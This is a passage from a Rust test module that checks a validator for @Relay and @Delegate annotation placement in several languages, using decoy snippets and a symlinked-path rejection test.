            let path = Path::new("server/routes/yon").with_extension(extension);
            let failure =
                validate_relay_placement(&path, source, "server/routes/yon").expect_err(extension);
            assert!(
                failure.to_string().contains("@Delegate"),
                "{extension}: {failure}"
            );
        }

        let python_comment_decoy = "@Delegate\n# class Fake:\nclass D:\n    @Relay('tool')\n    def POST(request):\n        pass\n";
        validate_relay_placement(
            Path::new("server/routes/yon.py"),
            python_comment_decoy,
            "server/routes/yon.py",
        )
        .expect("a comment cannot redirect the Python class scope");
    }

    #[test]
    fn relay_must_immediately_decorate_the_method_inside_its_owner() {
        for (extension, source) in [
            (
                "js",
                "@Delegate class D { @Relay('tool') field\nPOST(request) {} }",
            ),
            (
                "ts",
                "@Delegate class D { @Relay('tool') field\nPOST(request: unknown) {} }",
            ),
            (
                "java",
                "@Delegate class D { @Relay(\"tool\") Object field\nObject POST(Object request) {} }",
            ),
            (
                "cs",
                "[Delegate] class D { [Relay(\"tool\")] object field\nobject POST(object request) {} }",
            ),
            (
                "kt",
                "@Delegate object D { @Relay(\"tool\") val field\nfun POST(request: Any) {} }",
            ),
            (
                "php",
                "#[Delegate] class D { #[Relay(\"tool\")] public $field\npublic function POST($request) {} }",
            ),
            (
                "py",
                "@Delegate\nclass D:\n    @Relay('tool')\n    pass\ndef POST(request):\n    pass\n",
            ),
            (
                "rs",
                "#[Delegate] struct D; impl D { #[Relay(\"tool\")] value\nfn POST(request: &YonRequest) {} }",
            ),
        ] {
            let path = Path::new("server/routes/yon").with_extension(extension);
            let failure =
                validate_relay_placement(&path, source, "server/routes/yon").expect_err(extension);
            assert!(
                failure.to_string().contains("@Delegate"),
                "{extension}: {failure}"
            );
        }
    }

    #[test]
    fn longer_annotation_names_and_rust_impl_prefixes_never_create_delegate_owners() {
        for (extension, source) in [
            (
                "js",
                "@DelegateEvil class D { @Relay('tool') POST(request) {} }",
            ),
            (
                "ts",
                "@DelegateFactory class D { @Relay('tool') POST(request: unknown) {} }",
            ),
            (
                "py",
                "@DelegateEvil\nclass D:\n    @Relay('tool')\n    def POST(request):\n        pass\n",
            ),
            (
                "java",
                "@DelegateEvil class D { @Relay(\"tool\") Object POST(Object request) {} }",
            ),
            (
                "kt",
                "@DelegateFactory object D { @Relay(\"tool\") fun POST(request: Any) {} }",
            ),
            (
                "cs",
                "[DelegateEvil] class D { [Relay(\"tool\")] object POST(object request) {} }",
            ),
            (
                "php",
                "#[DelegateEvil] class D { #[Relay(\"tool\")] public function POST($request) {} }",
            ),
            (
                "rs",
                "#[DelegateEvil] struct D; impl D { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
            ),
            (
                "rs",
                "#[Delegate] struct D; impl Dangerous { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
            ),
        ] {
            let path = Path::new("server/routes/yon").with_extension(extension);
            let failure =
                validate_relay_placement(&path, source, "server/routes/yon").expect_err(extension);
            assert!(
                failure.to_string().contains("@Delegate"),
                "{extension}: {failure}"
            );
        }

        for rejected in [
            "#[Delegate] /* struct Dangerous */ struct D; impl Dangerous { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
            "#[Delegate] #[doc = \"struct Dangerous\"] struct D; impl Dangerous { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
        ] {
            let failure = validate_relay_placement(
                Path::new("server/routes/yon.rs"),
                rejected,
                "server/routes/yon.rs",
            )
            .expect_err("a lexical type-name decoy cannot select an impl");
            assert!(failure.to_string().contains("@Delegate"), "{failure}");
        }
        for accepted in [
            "#[Delegate] /* struct Dangerous */ struct D; impl D { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
            "#[Delegate] #[doc = \"struct Dangerous\"] struct D; impl D { #[Relay(\"tool\")] fn POST(request: &YonRequest) {} }",
        ] {
            validate_relay_placement(
                Path::new("server/routes/yon.rs"),
                accepted,
                "server/routes/yon.rs",
            )
            .expect("only the exact code-masked Delegate type owns its impl");
        }

        for (extension, source) in [
            (
                "java",
                "@DelegateEvil class D { @Relay(\"tool\") Object POST(Object request) {} }",
            ),
            (
                "kt",
                "@DelegateFactory object D { @Relay(\"tool\") fun POST(request: Any) {} }",
            ),
        ] {
            let failure = materialize_compiled_relays(extension, source, "server/routes/yon")
                .expect_err(extension);
            assert!(
                failure.to_string().contains("@Delegate"),
                "{extension}: {failure}"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_handler_paths_are_rejected() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("project");
        write(root.path(), "outside.py", b"class Handler: pass");
        fs::create_dir_all(root.path().join("server/routes")).expect("routes");
        symlink(
            root.path().join("outside.py"),
            root.path().join("server/routes/yon.py"),
        )
        .expect("symlink");
        let failure =
            HandlerSource::discover(root.path(), "server/routes/yon.py").expect_err("symlink");
        assert!(failure.to_string().contains("TY2004"));
    }
}
